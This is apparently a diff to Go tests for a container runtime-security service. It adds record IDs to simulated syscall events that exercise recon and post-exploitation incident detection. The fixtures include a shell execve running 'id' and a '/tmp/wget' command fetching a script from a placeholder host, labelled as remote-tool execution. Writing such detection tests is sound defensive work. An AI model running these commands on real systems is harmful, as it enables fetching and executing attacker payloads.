@@ -3,6 +3,7 @@ package api
 import (
 	"bytes"
 	"encoding/json"
+	"fmt"
 	"net/http"
 	"net/http/httptest"
 	"testing"
@@ -55,6 +56,7 @@ func TestRuntimeFlow_AgentToCoreToDBToV2API(t *testing.T) {
 	r.GET("/api/v2/runtime/pods/:uid/incidents", middleware.RequirePodUIDClusterScope(db, "uid"), GetPodRuntimeIncidentsScoped(db))
 	payload := []map[string]interface{}{
 		{
+			"source_record_id": "dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd",
 			"pod": map[string]interface{}{
 				"uid":       podUID,
 				"namespace": "ns",
@@ -65,6 +67,7 @@ func TestRuntimeFlow_AgentToCoreToDBToV2API(t *testing.T) {
 			"confidence": 0.9,
 		},
 		{
+			"source_record_id": "eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
 			"pod": map[string]interface{}{
 				"uid":       podUID,
 				"namespace": "ns",
@@ -240,6 +243,7 @@ func TestRuntimeFlow_StatefulIncidents_ReconAndPostExploit(t *testing.T) {
 	var payload []map[string]interface{}
 	for i := 0; i < 6; i++ {
 		payload = append(payload, map[string]interface{}{
+			"source_record_id": fmt.Sprintf("%064x", i+1),
 			"pod":        basePod,
 			"syscall":    "connect",
 			"target":     "dst=8.8.8.8:53 proto=udp dport=53",
@@ -250,8 +254,8 @@ func TestRuntimeFlow_StatefulIncidents_ReconAndPostExploit(t *testing.T) {
 	// - /bin/sh => INTERACTIVE_SHELL
 	// - /tmp/wget => TMP_BINARY_EXEC + REMOTE_TOOL_EXEC
 	payload = append(payload,
-		map[string]interface{}{"pod": basePod, "syscall": "execve", "target": "/bin/sh -c id", "confidence": 0.9},
-		map[string]interface{}{"pod": basePod, "syscall": "execve", "target": "/tmp/wget http://x/p.sh -O /tmp/p.sh", "confidence": 0.9},
+		map[string]interface{}{"source_record_id": fmt.Sprintf("%064x", 100), "pod": basePod, "syscall": "execve", "target": "/bin/sh -c id", "confidence": 0.9},
+		map[string]interface{}{"source_record_id": fmt.Sprintf("%064x", 101), "pod": basePod, "syscall": "execve", "target": "/tmp/wget http://x/p.sh -O /tmp/p.sh", "confidence": 0.9},
 	)
 
 	body, _ := json.Marshal(payload)
